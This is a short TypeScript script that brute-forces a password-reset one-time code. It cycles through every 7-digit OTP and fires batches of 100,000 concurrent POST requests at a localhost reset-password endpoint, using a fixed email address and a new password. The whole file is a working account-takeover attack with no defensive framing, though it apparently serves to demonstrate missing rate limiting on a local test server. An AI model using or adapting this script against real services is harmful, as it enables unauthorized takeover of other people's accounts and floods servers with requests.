import axios from "axios";
async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "sujeet1@gmail.com",
    otp: otp,
    newPassord: "avf",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios
    .request(config)
    .then((response) => {
      console.log(JSON.stringify(response.data));
    })
    .catch((error) => {
      console.log(error);
    });
}

async function main() {
    for (let i = 1000000; i < 9999999; i+=100000) {
      const promises = [];
      console.log("here for " + i);
      for (let j = 0; j < 100000; j++) {
        promises.push(sendRequest((i + j).toString()))
      }
      await Promise.all(promises);
    }
  }
  
  main()
